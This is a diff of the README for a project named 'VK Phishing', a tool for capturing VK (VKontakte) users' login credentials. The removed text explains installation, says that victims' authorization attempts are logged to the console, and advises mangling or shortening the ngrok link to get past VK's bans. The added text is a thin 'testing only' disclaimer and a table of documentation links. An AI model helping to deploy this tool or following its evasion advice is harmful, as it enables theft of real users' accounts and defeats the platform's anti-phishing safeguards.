@@ -1,57 +1,18 @@
-## [👉 Читать на русском 🇷🇺](docs/ru.md)
+# VK Phishing
 
-# Disclaimer
+## Disclaimer / Отказ от ответственности
 
-This tool is ONLY FOR testing. Author is not responsible for anything you do with this tool.
+**`🇺🇸: This tool is ONLY FOR testing. Author is not responsible for anything you do with this tool.`**
 
-## Installation
 
-1. Install [node js and npm](https://nodejs.org/en/download/) if not installed yet
+**`🇷🇺: Эта утилита предназначена ТОЛЬКО ДЛЯ тестирования. Всю ответственность за её использование вы берёте на себя. Мне просто нравится писать всякую хуйню и работать с VK API.`**
 
-2. Clone this repo
 
-For that, open Terminal/CMD and execute command
+## Table Of Contents / Документация
 
-```BASH
-git clone https://github.com/xxhax-team/vk-phishing.git
-```
-
-Or download this repo as ZIP
-
-![Repo downloading guide](docs/how-to-clone.png)
-
-3. Unzip it into the folder
-
-4. Open this folder
-
-5. Run file `install.bat` or `install.sh` depending on your system
-
-This file will open terminal and perform installation tasks.
-
-After a success (when there is no red text in terminal) run file `start.bat` or `start.sh` (again depending on your system).
-
-6. After successful launch you will see something like:
-
-![Successful startup](docs/successful-startup.png)
-
-**User's auth attempt will be logged in console**
-
-![Authorization Attempt](docs/authorization-attempt.png)
-
-If it will end successful, you will see
-
-![Successful auth](docs/successful-auth.png)
-
-#### IMPORTANT
-
-DO NOT SHARE NGROK URL IN VK You may get banned.
-Please mangle or shorten this link for bypass.
-
-## Configuration
-
-See in `config.yaml` not so many options,
-everything is commented
-
-### Good luck!
-
-## [👉 Читать на русском 🇷🇺](docs/ru.md)
+| 🇺🇸 On English | 🇷🇺 По Русски |
+| --- | --- |
+| [Installation](./docs/installation.en.md) | [Установка](./docs/installation.ru.md) |
+| [FAQ](./docs/faq.en.md) | [ЧаВо](./docs/faq.ru.md) |
+| - | [Перевод Конфига](./docs/config.ru.md) |
+| [Plugins CreationGuide](./docs/plugins.md) | - |
